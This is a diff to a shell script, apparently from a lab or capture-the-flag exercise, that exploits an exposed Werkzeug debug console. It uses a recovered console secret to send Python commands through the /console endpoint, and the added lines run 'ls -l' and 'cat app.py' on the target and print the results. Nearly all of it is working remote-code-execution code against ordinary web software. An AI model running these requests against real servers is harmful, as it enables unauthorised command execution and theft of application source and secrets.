@@ -26,4 +26,9 @@ echo "--> Console secret is : $SECRET"
 # Listing files
 echo "3 - LISTING FILES WITH PYTHON"
 curl -s -X GET "http://$target_ip:86/console?cmd=import%20os%3B%20print(os.popen(%22ls%20-l%22).read())&__debugger__=yes&frm=0&s=$SECRET" > /work/5-ls.html
+cat /work/5-ls.html
 
+# Reading app.py
+echo "4 - PARSING APP.PY"
+curl -s -X GET "http://$target_ip:86/console?cmd=import%20os%3B%20print(os.popen(%22cat%20app.py%22).read())&__debugger__=yes&frm=0&s=$SECRET" > /work/5-app.html
+cat /work/5-app.html
